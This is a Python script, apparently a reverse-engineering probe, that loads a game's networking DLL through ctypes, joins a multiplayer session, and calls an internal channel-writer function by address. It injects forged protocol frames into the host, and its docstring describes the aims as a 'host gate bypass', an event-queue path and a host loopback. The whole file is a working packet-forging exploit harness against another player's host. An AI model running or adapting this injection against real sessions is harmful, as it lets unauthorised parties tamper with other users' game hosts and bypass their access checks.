"""P5 channel forge probe (child): inject crafted inner frames through the
game's own low-level channel writer 0x10002df0 (netobj, member_id, data, len).

The writer prepends [htonl(len+5)][outer 0x06][htonl(netobj[0])] to our data,
so we control only the inner payload -- exactly the lever needed:
  cf6  : inner [0x06][seq=0][pad]   -> host gate bypass -> member +0x2c = 1
  cf63 : inner [0x63][seq=0][pad]   -> host event-7 queue path
  cf46 : inner 0x46 frame w/ target=host id -> host loopback 0x100060b0
Control phase re-runs NetMsg_Chat for a known-good reference capture.
"""
import argparse
import ctypes as c
from ctypes import wintypes as w
import hashlib
import json
import socket as pysocket
import struct
import sys
import time
from pathlib import Path

KOEINM = '629f500a4fbb1fdcb056c4d681476a31f0ae31e6cd9d26221e8faaeb41283841'
NETHOOK = '5b3790982f7c54f891e5b3c8559e7a61c7589d8a4a9d68bc9f8f8992b5b678b4'


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', required=True)
    ap.add_argument('--session-name', required=True)
    ap.add_argument('--username', required=True)
    ap.add_argument('--hold', type=int, default=20)
    ap.add_argument('--phases', default='chat,cf6,cf63,cf46')
    ap.add_argument('--sender-id', type=lambda x: int(x, 0), default=0)
    ap.add_argument('--join-wait', type=int, default=3)
    ap.add_argument('--phase-gap', type=float, default=3.0)
    args = ap.parse_args()
    assert c.sizeof(c.c_void_p) == 4
    dllpath = Path(r'C:\sgi\run-3.5\3I\Koeinm.dll')
    assert hashlib.sha256(dllpath.read_bytes()).hexdigest() == KOEINM
    assert hashlib.sha256(Path(r'C:\sgi\run-3.5\NetHookCore.dll').read_bytes()).hexdigest() == NETHOOK
    u = c.WinDLL('user32')
    u.PeekMessageW.argtypes = [c.POINTER(w.MSG), w.HWND, w.UINT, w.UINT, w.UINT]
    u.TranslateMessage.argtypes = [c.POINTER(w.MSG)]
    u.DispatchMessageW.argtypes = [c.POINTER(w.MSG)]
    msg = w.MSG()

    def pump():
        while u.PeekMessageW(c.byref(msg), None, 0, 0, 1):
            u.TranslateMessage(c.byref(msg))
            u.DispatchMessageW(c.byref(msg))

    dll = c.WinDLL(str(dllpath))
    hook = c.WinDLL(r'C:\sgi\run-3.5\NetHookCore.dll')
    k32 = c.WinDLL('kernel32')
    k32.GetModuleHandleW.restype = c.c_void_p
    k32.GetModuleHandleW.argtypes = [c.c_wchar_p]
    base = k32.GetModuleHandleW('Koeinm.dll')
    result = {'transport_loaded': bool(hook._handle), 'snapshots': [], 'frames': [],
              'module_base': hex(base or 0),
              'args': {k: v for k, v in vars(args).items()}}
    if not base:
        result['abort'] = 'no_module_base'
        print(json.dumps(result))
        return

    writer = c.CFUNCTYPE(c.c_int, c.c_void_p, c.c_uint32, c.c_char_p, c.c_uint32)(
        base + 0x2df0)  # RVA of 0x10002df0
    netobj = c.c_void_p(base + 0x12170)

    def export(name, argtypes, restype=c.c_int):
        f = getattr(dll, name)
        f.argtypes = argtypes
        f.restype = restype
        return f

    start = export('_NetMsg_Start@36', [c.c_uint32]*8 + [c.POINTER(c.c_uint32)])
    getip = export('_NetMsg_GetIPAddress@4', [c.POINTER(c.c_void_p)])
    opens = export('_NetMsg_OpenSession@20', [c.c_char_p, c.c_char_p, c.c_char_p, c.c_uint32, c.c_uint32])
    connected = export('_NetMsg_IsConnected@0', [])
    setdata = export('_NetMsg_SetDataWindow@8', [w.HWND, w.UINT])
    chat = export('_NetMsg_Chat@4', [c.c_char_p])
    exit_session = export('_NetMsg_ExitSession@0', [])
    end = export('_NetMsg_End@0', [])

    def snapshot(stage):
        result['snapshots'].append({'stage': stage, 'connected': connected(),
                                    't': round(time.time(), 1)})

    host_id = struct.unpack('!I', pysocket.inet_aton(args.target))[0]

    def inner(inner_type, seq, size=9):
        p = bytes([inner_type]) + struct.pack('!I', seq)
        return p + b'\x00'*max(0, size - len(p))

    def inner46(target, sender, data):
        return (bytes([0x46]) + b'\x00'*8 + struct.pack('!I', len(data)+1)
                + struct.pack('!I', sender) + struct.pack('!I', target)
                + data + b'\x00')

    try:
        flag = c.c_uint32()
        result['start_rc'] = start(8, 64, 7777, 100, 100, 78731, 0, 0, c.byref(flag))
        pump()
        ip_ptr = c.c_void_p()
        ip_count = getip(c.byref(ip_ptr))
        own = None
        if 0 < ip_count <= 20 and ip_ptr.value:
            addresses = list((c.c_uint32*ip_count).from_address(ip_ptr.value))
            result['probe_addresses'] = ['.'.join(str(x) for x in struct.pack('!I', v))
                                         for v in addresses]
            own = addresses[0]
        if not own:
            result['abort'] = 'no_relay_address'
            return
        own_id = args.sender_id or own
        result['own_id'] = own_id
        result['host_id'] = host_id
        setdata(None, 0x2462)
        rc = opens(args.target.encode('ascii'), args.session_name.encode('gbk'),
                   args.username.encode('gbk'), own, 3000)
        result['open_session'] = {'rc': rc}
        pump()
        snapshot('after_join')
        if rc != 0:
            result['abort'] = 'join_failed'
            return
        time.sleep(args.join_wait)
        pump()
        snapshot('settled')
        for phase in args.phases.split(','):
            entry = {'phase': phase, 'attempts': []}
            if phase == 'chat':
                entry['chat_rc'] = int(chat(b'p5ctl'))
            else:
                if phase == 'cf6':
                    data, candidates = inner(0x06, 0), [('host', host_id), ('own', own_id)]
                elif phase == 'cf63':
                    data, candidates = inner(0x63, 0), [('host', host_id), ('own', own_id)]
                elif phase == 'cf46':
                    data, candidates = inner46(host_id, own_id, b'p5inject'), [('host', host_id), ('own', own_id)]
                elif phase == 'cf6host':
                    data, candidates = inner(0x06, 0), [('host', host_id)]
                else:
                    data, candidates = None, []
                for via, cid in candidates:
                    if data is None:
                        break
                    rc = writer(netobj, cid, data, len(data))
                    entry['attempts'].append({'via': via, 'id': cid, 'rc': int(rc)})
                    if rc == 0:
                        break
                entry['data'] = data.hex() if data is not None else None
            result['frames'].append(entry)
            pump()
            time.sleep(args.phase_gap)
            snapshot(f'after_{phase}')
        deadline = time.monotonic() + args.hold
        last = 0
        stage = 0
        while time.monotonic() < deadline:
            pump()
            if time.monotonic() - last >= 5:
                stage += 1
                snapshot(f'hold_{stage*5}s')
                last = time.monotonic()
            time.sleep(0.05)
    finally:
        result['cleanup'] = {'exit_rc': exit_session(), 'end_rc': end()}
    print(json.dumps(result, ensure_ascii=True))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(json.dumps({'error_type': type(e).__name__}))
        sys.exit(1)
